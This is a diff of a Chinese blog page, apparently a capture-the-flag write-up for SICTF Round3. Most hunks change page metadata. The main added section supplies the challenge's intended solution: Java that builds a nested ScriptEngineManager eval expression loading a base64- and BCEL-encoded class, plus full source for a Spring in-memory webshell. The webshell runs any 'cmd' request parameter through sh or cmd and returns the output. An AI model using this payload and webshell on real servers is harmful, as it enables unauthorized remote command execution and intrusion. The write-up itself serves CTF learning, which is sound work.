@@ -31,6 +31,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219175337653.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240220224751404.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240220225314409.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240225211458845.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219180610100.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219180831954.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219181336365.png">
@@ -49,7 +50,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184457111.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184506559.png">
 <meta property="article:published_time" content="2024-02-19T03:10:21.000Z">
-<meta property="article:modified_time" content="2024-02-20T17:20:07.556Z">
+<meta property="article:modified_time" content="2024-02-25T13:16:14.206Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240221001812164.png">
@@ -257,7 +258,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          17k 字
+          19k 字
         
       </span>
     
@@ -268,7 +269,7 @@
         
         
         
-          140 分钟
+          158 分钟
         
       </span>
     
@@ -583,6 +584,64 @@ r = requests.post(url, data).text
 
 <p>太麻烦了，没我的方便</p>
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>预期是不出网的，等WP出了再补充</p>
+<p>双层scriptenginemanager的eval解密base64，base64的内容为bcel打内存马</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span><span class="hljs-operator">+</span> <span class="hljs-title class_">Utility</span>.<span class="hljs-property">encode</span>(<span class="hljs-title class_">Repository</span>.<span class="hljs-property">lookupClass</span>(<span class="hljs-variable">memshell</span>.<span class="hljs-property">class</span>).<span class="hljs-property">getBytes</span>(),<span class="hljs-literal">true</span>);
+<span class="hljs-title class_">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(<span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s1</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>).newInstance()&quot;</span>;
+<span class="hljs-title class_">String</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Base</span>64.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(<span class="hljs-variable">s2</span>.<span class="hljs-property">getBytes</span>());
+
+<span class="hljs-title class_">String</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Class.forName(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>javax.script.ScriptEngineManager<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>).newInstance().getEngineByName(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>JavaScript<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>).eval(new java.lang.String(java.util.Base64.getDecoder().decode(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s3</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>)))&quot;</span>;
+<span class="hljs-title class_">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>.getClass().forName(<span class="hljs-char escape_">\&quot;</span>javax.script.ScriptEngineManager<span class="hljs-char escape_">\&quot;</span>).newInstance().getEngineByName(<span class="hljs-char escape_">\&quot;</span>JavaScript<span class="hljs-char escape_">\&quot;</span>).eval(<span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s4</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>)&#125;&quot;</span>;
+<span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>((<span class="hljs-variable">exp</span>));</code></pre></div>
+
+<p>出题人的马没成功，改进了一下</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.PrintWriter;
+<span class="hljs-keyword">import</span> java.lang.reflect.Method;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">memshell</span> &#123;
+    <span class="hljs-keyword">static</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">Class</span> <span class="hljs-variable">requestContextHolder</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);
+
+            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> requestContextHolder.getDeclaredMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>);
+
+            m = obj.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> m.invoke(obj);
+
+            m = obj.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> m.invoke(obj);
+
+            m = request.getClass().getMethod(<span class="hljs-string">&quot;getParameter&quot;</span>, String.class);
+
+            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (String) m.invoke(request, <span class="hljs-string">&quot;cmd&quot;</span>);
+            <span class="hljs-keyword">if</span>(cmd == <span class="hljs-literal">null</span>)&#123;
+                cmd = <span class="hljs-string">&quot;id&quot;</span>;
+            &#125;
+            String[] cmds;
+
+            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;
+                cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;
+            &#125;
+
+            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();
+
+            m = response.getClass().getMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);
+            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> (PrintWriter) m.invoke(response);
+            printWriter.println(output);
+            printWriter.flush();
+            printWriter.close();
+        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;
+
+        &#125;
+
+
+    &#125;
+&#125;</code></pre></div>
+
+<p><img src="/../images/SICTF-Round3/image-20240225211458845.png" srcset="/img/loading.gif" lazyload alt="image-20240225211458845"></p>
 <h2 id="【进阶】CC-deserialize"><a href="#【进阶】CC-deserialize" class="headerlink" title="【进阶】CC_deserialize *"></a>【进阶】CC_deserialize *</h2><p>遗憾啊，0解题痛失一血，</p>
 <p>截取的聊天段落</p>
 <p><img src="/../images/SICTF-Round3/image-20240219180610100.png" srcset="/img/loading.gif" lazyload alt="image-20240219180610100"></p>
@@ -844,6 +903,12 @@ ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> 
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/02/24/HGAME-week4/" title="HGAME-week4">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HGAME-week4</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
